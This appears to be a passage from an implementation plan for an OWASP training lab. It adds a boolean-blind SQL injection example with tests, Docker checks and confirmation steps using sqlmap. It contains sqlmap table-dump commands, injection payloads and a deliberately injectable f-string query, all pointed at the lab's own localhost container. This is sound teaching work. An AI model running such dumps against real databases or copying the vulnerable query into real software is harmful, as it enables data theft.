        <pre><code class="language-python">sqlmap -u "http://127.0.0.1:5001/a03/roster-lookup?id=1" \
  --batch --technique=B --level=1 --risk=1 \
  -D owasp_lab -T a03_employees -C id,name,email,department,salary --dump</code></pre>
        <p><code>--technique=B</code> tells sqlmap to use boolean-based
        blind extraction specifically (matching this endpoint's
        found/not-found signal), rather than trying every technique it
        knows. Within a couple of minutes, sqlmap recovers every row of
        the table on its own — the same data Task 2 took ~20 requests to
        extract just one number of.</p>
      </div>
    </div>
  </li>
</ol>
{% endblock %}

{% block vulnerable_code %}query = f"SELECT COUNT(*) FROM a03_employees WHERE id = {emp_id}"
count = db.session.execute(text(query)).scalar()
found = bool(count)
{% endblock %}

{% block secure_code %}query = text("SELECT COUNT(*) FROM a03_employees WHERE id = :emp_id")
count = db.session.execute(query, {"emp_id": emp_id}).scalar()
found = bool(count)
{% endblock %}

{% block live_example %}
<form method="get" class="mb-3">
  <div class="input-group">
    <input type="text" class="form-control" name="id" value="{{ emp_id }}" placeholder="Employee ID">
    <button type="submit" class="btn btn-primary">Look up</button>
  </div>
</form>
{% if found is not none %}
<p>
  {% if found %}Employee record found.
  {% else %}No employee with that ID matches.{% endif %}
</p>
{% endif %}
{% endblock %}
```

Note on the `{{ '{id}' }}` in Explanation: same plain-text-placeholder
convention as Task 1's `roster.html`, not a `{% raw %}` situation — see
Task 1 Step 9's note for the full explanation.

**Verify before committing:** grep the completed template for the exact
strings `Employee record found.` and `No employee with that ID matches.`
— they must appear ONLY inside the `live_example` block (the two
`{% if found %}`/`{% else %}` branches). If either string appears
anywhere in Explanation, Detect, Exploitation, or Tasks, that is the
exact collision bug two prior sub-projects hit — fix the prose to
describe the outcome without quoting the literal string before
proceeding.

- [ ] **Step 6: Run the tests to verify they pass**

Run: `pytest tests/test_a03_roster_lookup.py -v`
Expected: all 6 PASS.

Note: Task 1 left the full suite at 203 (196 + 7). This task adds 6 more
new tests, bringing the expected full-suite total to 209 (see Step 8).

- [ ] **Step 7: Update the hardcoded nav-list tests**

Inserting `roster-lookup` breaks the same two tests in
`tests/test_a03_overview.py` again — apply the same additive pattern as
Task 1's Step 8, at the new position.

In `test_a03_registered_in_nav`, change:

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

to (the new `"Hard"` is inserted at index 3, immediately after
`blind-sqli`'s existing `"Hard"` and before `reflected-xss`'s
`"Medium"`):

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

In `test_a03_examples_grouped_by_vulnerability_subtype`, change:

```python
    assert [e.id for e in grouped[0][1]] == [
        "sqli-login",
        "union-exfiltration",
        "roster-sort",
        "blind-sqli",
    ]
```

to:

```python
    assert [e.id for e in grouped[0][1]] == [
        "sqli-login",
        "union-exfiltration",
        "roster-sort",
        "blind-sqli",
        "roster-lookup",
    ]
```

- [ ] **Step 8: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (203 + 6 = 209)

- [ ] **Step 9: Commit**

```bash
git add app/categories/a03_injection/routes.py app/categories/a03_injection/__init__.py \
  app/categories/a03_injection/templates/a03_injection/roster_lookup.html \
  tests/test_a03_roster_lookup.py tests/test_a03_overview.py
git commit -m "feat: add A03 numeric boolean-blind injection example with multi-task pattern and sqlmap task (Hard)"
```

---

### Task 3: Full regression + Docker verification + sqlmap confirmation

**Files:**
- Modify (conditionally): `app/categories/a03_injection/templates/a03_injection/roster_lookup.html`
  — ONLY if the documented `sqlmap` command in Task 2's Tasks section
  doesn't work as written against the real container (see Step 3).

**Interfaces:**
- Consumes: nothing new (verifies Tasks 1–2's combined output).
- Produces: nothing — this is the final task.

- [ ] **Step 1: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (209 tests)

- [ ] **Step 2: Docker end-to-end verification**

```bash
docker compose up --build -d
```

No new dependency and no new service in this plan — this rebuild has no
new pip package or Docker image to verify, just the app code change.

Via curl against the live container (`http://127.0.0.1:5001`):

- `/a03/` returns 200 and the SQL Injection group's sidebar section now
  lists five examples including "Employee Roster Sort" and
  "Employee Lookup".
- `/a03/roster` returns 200. POST/GET `sort=4` succeeds;
  `sort=5` produces an error response (Flask's default 500 page under
  real, non-testing config — confirm this is what actually happens
  against the live container, matching the plan's Step 4 note about the
  test-vs-live difference). `sort=(CASE WHEN (1=1) THEN id ELSE id * -1 END)`
  vs `sort=(CASE WHEN (1=2) THEN id ELSE id * -1 END)` genuinely reverses
  row order — confirm this specifically against the REAL Postgres
  backend, not just the SQLite-backed unit tests, since ORDER BY/CASE
  evaluation details can differ between database engines.
- `/a03/roster-lookup?id=9` returns 200, "Employee record found.".
  `/a03/roster-lookup?id=1 OR 1=1` and `?id=1 AND 1=2` genuinely
  discriminate true/false against the real container.
- `/force-reset` still works cleanly with the new examples in place.

- [ ] **Step 3: Confirm a working `sqlmap` invocation against the real container**

This is the single most important verification in this task. Install
`sqlmap` if it's not already available in this environment
(`pip install sqlmap` installs a working CLI, verified during this
plan's design phase — version 1.10.9 confirmed working). Then run the
exact command documented in Task 2's Tasks-block Step 5 solution:

```bash
sqlmap -u "http://127.0.0.1:5001/a03/roster-lookup?id=1" \
  --batch --technique=B --level=1 --risk=1 \
  -D owasp_lab -T a03_employees --dump
```

Confirm sqlmap:
1. Detects the boolean-blind injection point automatically.
2. Successfully dumps the full `a03_employees` table — all 9 rows, all 5
   columns, with values matching Task 1's seeded data exactly (Morgan
   Reyes / morgan.reyes@owasp-lab.internal / Executive / 285000 must be
   among the dumped rows).

**If the bare `--dump` command doesn't successfully enumerate columns or
dump the table**, try the documented fallback from the template (explicit
`-C id,name,email,department,salary`). If NEITHER documented command
works, iterate on the invocation yourself (things worth trying, in order:
confirm `--technique=B` is actually being used and not silently falling
back — check sqlmap's own output; try `--string="Employee record found."`
or `--not-string="No employee with that ID matches."` to give sqlmap an
explicit content-based oracle instead of relying on its own heuristic
diffing; try `--dump-all -D owasp_lab` as a broader fallback). Once you
find a command that genuinely works, if it differs from what's currently
written in `roster_lookup.html`'s Task 3 solution, UPDATE that template
section to the command that actually works — this is an in-scope
correction for this task per the plan's Global Constraints, not a
deferred defect. Document in your report exactly what you tried, what
worked, and whether the template needed correcting.

Do not accept "sqlmap found the injection point" alone as sufficient —
the task's own stated goal is a full table dump, and that specific claim
must be demonstrated with real dumped data matching the real seeded
values.

Tear down cleanly afterward:

```bash
docker compose down
```

- [ ] **Step 4: Commit (only if Step 3 required a template correction)**

If the documented `sqlmap` command needed correcting in
`roster_lookup.html`:

```bash
git add app/categories/a03_injection/templates/a03_injection/roster_lookup.html
git commit -m "fix: correct sqlmap invocation in Employee Lookup Task 3 solution to the command verified working against the real container"
```

If no correction was needed, there is nothing to commit — report DONE
with the verification evidence (including the full list of dumped rows)
in your report file rather than an empty commit.
